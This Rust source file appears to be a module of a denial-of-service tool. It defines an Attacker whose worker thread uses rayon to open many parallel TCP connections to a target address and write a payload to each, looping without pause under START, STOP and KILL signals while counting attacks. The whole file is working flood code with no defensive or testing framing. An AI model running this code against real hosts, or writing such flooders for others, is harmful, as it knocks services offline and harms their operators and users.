use crate::dos::Signal::{KILL, START, STOP};
use atomic_counter::AtomicCounter;
use rayon::iter::{ParallelBridge, ParallelIterator};
use rayon::prelude::*;
use std::borrow::BorrowMut;
use std::cell::RefCell;
use std::future::Future;
use std::io::{Error, Read, Write};
use std::net::{IpAddr, SocketAddr, TcpStream};
use std::ops::Deref;
use std::pin::Pin;
use std::ptr::null;
use std::rc::Rc;
use std::sync::mpsc::Sender;
use std::sync::mpsc::TryRecvError::Disconnected;
use std::sync::mpsc::{Receiver, SendError};
use std::sync::Arc;
use std::{io, net};

/**
* Signals that can be sent to an Attacker object
*/
#[derive(Eq, PartialEq)]
enum Signal {
    START,
    STOP,
    KILL,
}

pub struct Attacker {
    signal_sender: Sender<Signal>,
    future: Pin<Box<dyn Future<Output = Result<(), Vec<Error>>> + 'static>>,
}

/**
* Gets moved to the thread that attacks a target
*/
struct AttackerThread {
    address: SocketAddr,
    attacks_per_cycle: usize,
    payload: Vec<u8>,
    signal_rec: Receiver<Signal>,
    counter: Arc<dyn AtomicCounter<PrimitiveType = usize>>,
}

impl AttackerThread {
    fn attack_once(address: &SocketAddr, payload: &[u8]) -> io::Result<()> {
        let mut connection = TcpStream::connect(address)?;
        // print!("connected ... ");
        connection.write_all(payload)?;
        // let mut resp = String::new();
        // connection.read_to_string(&mut resp)?;
        // println!("Response: {}", resp);
        // print!("attacked");
        Ok(())
    }

    fn attack(&self) -> Result<(), Vec<Error>> {
        let addr = &self.address;
        let payload = self.payload.as_slice();
        let counter_clone = self.counter.clone();
        // runs "attacks_per_cycle" number of attacks on the target and returns any errors
        let errors = (0..self.attacks_per_cycle)
            .into_par_iter()
            .map(move |_| {
                Self::attack_once(addr, payload)?;
                counter_clone.inc();
                Ok(())
            })
            .filter(|maybe_err| maybe_err.is_err())
            .map(|err| err.err().unwrap())
            .collect::<Vec<Error>>();

        if errors.len() == 0 {
            return Ok(());
        }
        errors.iter().for_each(|e| println!("Error: {}", e));

        return Err(errors);
    }

    async fn run(self) -> Result<(), Vec<Error>> {
        let mut state = START;
        loop {
            self.update_state(&mut state);
            if state == START {
                self.attack()?;
            } else if state == STOP {
                // do nothing
            }
            if state == KILL {
                return Ok(());
            }
        }
    }

    fn update_state(&self, state: &mut Signal) {
        match self.signal_rec.try_recv() {
            Ok(s) => {
                *state = s;
            }

            Err(Disconnected) => {
                *state = KILL;
            }
            _ => {}
        }
    }
}

impl Attacker {
    pub fn new(
        address: SocketAddr,
        payload: Vec<u8>,
        attacks_per_cycle: usize,
        attack_counter: Arc<dyn AtomicCounter<PrimitiveType = usize>>,
    ) -> std::io::Result<Attacker> {
        let (send, rec) = std::sync::mpsc::channel();

        let attacker_thread = Box::new(AttackerThread {
            address,
            attacks_per_cycle,
            payload,
            signal_rec: rec,
            counter: attack_counter.clone(),
        });

        let mut attacker = Attacker {
            signal_sender: send,
            future: Box::pin(attacker_thread.run()),
        };

        return Ok(attacker);
    }

    pub async fn run(self) -> Result<(), Vec<Error>> {
        self.future.await
    }

    pub fn start(&mut self) {
        match self.signal_sender.send(START) {
            _ => {}
        }
    }

    pub fn stop(&mut self) {
        match self.signal_sender.send(STOP) {
            _ => {}
        }
    }

    pub async fn kill(&mut self) {
        match self.signal_sender.send(KILL) {
            _ => {}
        }
    }
}
